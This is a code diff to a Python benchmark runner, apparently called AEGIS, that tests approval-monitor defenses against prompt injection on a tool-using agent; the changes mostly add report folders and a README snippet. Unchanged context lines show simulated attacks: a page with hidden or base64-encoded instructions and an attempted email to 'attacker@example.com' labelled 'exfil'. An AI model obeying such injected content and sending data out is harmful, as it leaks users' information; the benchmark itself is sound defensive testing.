@@ -3,7 +3,7 @@ from __future__ import annotations
 import json
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Dict, List
+from typing import Any, Dict, List, Optional
 
 from aegis.core.run import new_run
 from aegis.defenses.approval_monitor import Policy
@@ -96,7 +96,11 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
         res = search_tool.execute(ctx=ctx, page="evil_page.html")
         html = res["html"]
 
-        ctx.trace.event("untrusted_content_received", source="search_local_page", note="HTML may contain hidden instructions")
+        ctx.trace.event(
+            "untrusted_content_received",
+            source="search_local_page",
+            note="HTML may contain hidden instructions",
+        )
         context_text = f"untrusted_html: {html[:300]}"
 
         _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) indirect injection", context_text)
@@ -124,7 +128,11 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
         res = search_tool.execute(ctx=ctx, page="encoded_page.html")
         html = res["html"]
 
-        ctx.trace.event("untrusted_content_received", source="search_local_page", note="May contain encoded instructions")
+        ctx.trace.event(
+            "untrusted_content_received",
+            source="search_local_page",
+            note="May contain encoded instructions",
+        )
 
         payload = _extract_base64_marker(html)
         ctx.trace.event("decode_attempt", encoding="base64", found=bool(payload))
@@ -150,12 +158,76 @@ def run_scenario_demo(ctx, scenario: str, policy_name: str, guard: str) -> None:
     raise ValueError(f"Unknown scenario for bench runner: {scenario}")
 
 
-def bench(out_root: str, scenarios: List[str], policies: List[str], guard: str) -> Dict[str, Any]:
+def _write_readme_snippet(report_dir: Path, payload: Dict[str, Any]) -> Path:
+    """
+    Generates a small Markdown snippet you can paste into the repo README.
+    """
+    md = bench_summary_to_markdown(payload)
+    rel = report_dir.as_posix()
+    snippet_lines = [
+        "## Latest AEGIS Bench Results",
+        "",
+        f"- Report folder: `{rel}`",
+        f"- Summary: `{rel}/bench_summary.md`",
+        "",
+        "### Snapshot",
+        "",
+        md.splitlines()[0],  # "# AEGIS Bench Summary"
+        "",
+        "> (Open the full report file for details.)",
+        "",
+    ]
+    # Include the results table only (keep snippet short)
+    in_table = False
+    for line in md.splitlines():
+        if line.startswith("| Scenario |"):
+            in_table = True
+        if in_table:
+            snippet_lines.append(line)
+            # stop after table ends (blank line)
+            # We'll stop once we hit an empty line after having started.
+        if in_table and line.strip() == "":
+            break
+
+    out = report_dir / "README_SNIPPET.md"
+    out.write_text("\n".join(snippet_lines).strip() + "\n", encoding="utf-8")
+    return out
+
+
+def bench(
+    out_root: str,
+    scenarios: List[str],
+    policies: List[str],
+    guard: str,
+    report_root: str = "reports/bench",
+    report_id: Optional[str] = None,
+) -> Dict[str, Any]:
+    """
+    Creates an experiment report folder:
+      reports/bench/<report_id>/
+        bench_summary.json
+        bench_summary.md
+        README_SNIPPET.md
+        runs/<run_id>/trace.jsonl (+ metrics.json via eval)
+
+    'out_root' is interpreted as a *relative folder name inside the report dir* (usually "runs").
+    """
+    # Choose report_id
+    if report_id is None:
+        # use the same timestamp style as run ids (safe for sorting)
+        from datetime import datetime
+
+        report_id = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    report_dir = Path(report_root) / report_id
+    runs_dir = report_dir / out_root
+    runs_dir.mkdir(parents=True, exist_ok=True)
+
     results: List[BenchResult] = []
 
     for scenario in scenarios:
         for policy in policies:
-            ctx = new_run(out_root)
+            ctx = new_run(str(runs_dir))
             ctx.trace.event("scenario_loaded", name=scenario, path=f"aegis/scenarios/{scenario}.txt")
 
             run_scenario_demo(ctx=ctx, scenario=scenario, policy_name=policy, guard=guard)
@@ -180,6 +252,10 @@ def bench(out_root: str, scenarios: List[str], policies: List[str], guard: str) 
             )
 
     payload: Dict[str, Any] = {
+        "report_root": report_root,
+        "report_id": report_id,
+        "report_dir": str(report_dir),
+        "runs_dir": str(runs_dir),
         "out_root": out_root,
         "scenarios": scenarios,
         "policies": policies,
@@ -187,13 +263,17 @@ def bench(out_root: str, scenarios: List[str], policies: List[str], guard: str) 
         "results": [r.__dict__ for r in results],
     }
 
-    out_path = Path(out_root)
-    out_path.mkdir(parents=True, exist_ok=True)
-
-    summary_json = out_path / "bench_summary.json"
-    summary_md = out_path / "bench_summary.md"
+    summary_json = report_dir / "bench_summary.json"
+    summary_md = report_dir / "bench_summary.md"
 
     summary_json.write_text(json.dumps(payload, indent=2), encoding="utf-8")
     summary_md.write_text(bench_summary_to_markdown(payload), encoding="utf-8")
 
-    return {"summary_json": str(summary_json), "summary_md": str(summary_md), "payload": payload}
+    snippet_path = _write_readme_snippet(report_dir, payload)
+
+    return {
+        "summary_json": str(summary_json),
+        "summary_md": str(summary_md),
+        "snippet_md": str(snippet_path),
+        "payload": payload,
+    }
